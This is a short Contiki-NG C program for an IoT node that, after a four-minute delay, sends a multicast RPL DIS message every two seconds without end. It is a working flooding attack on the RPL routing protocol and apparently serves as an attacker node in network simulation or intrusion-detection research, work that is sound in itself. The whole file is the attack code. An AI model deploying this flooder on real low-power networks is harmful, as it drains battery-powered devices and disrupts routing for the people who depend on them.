#include "contiki.h"
#include "net/routing/rpl-lite/rpl.h"
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "sys/log.h"

#define LOG_MODULE "DIS-FLOODER"
#define LOG_LEVEL LOG_LEVEL_INFO

#define ATTACK_START_DELAY (240 * CLOCK_SECOND)
#define FLOOD_INTERVAL (2 * CLOCK_SECOND)

PROCESS(dis_flooder_router_process, "Delayed DIS flooding attacker");
AUTOSTART_PROCESSES(&dis_flooder_router_process);

PROCESS_THREAD(dis_flooder_router_process, ev, data)
{
  static struct etimer timer;

  PROCESS_BEGIN();

  LOG_INFO("DIS FLOODER: started, attack disabled\n");
  etimer_set(&timer, ATTACK_START_DELAY);
  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));

  LOG_WARN("DIS FLOOD ATTACK: enabled\n");
  etimer_set(&timer, FLOOD_INTERVAL);

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
    rpl_icmp6_dis_output(NULL);
    LOG_INFO("DIS FLOOD ATTACK: sent multicast DIS\n");
    etimer_reset(&timer);
  }

  PROCESS_END();
}
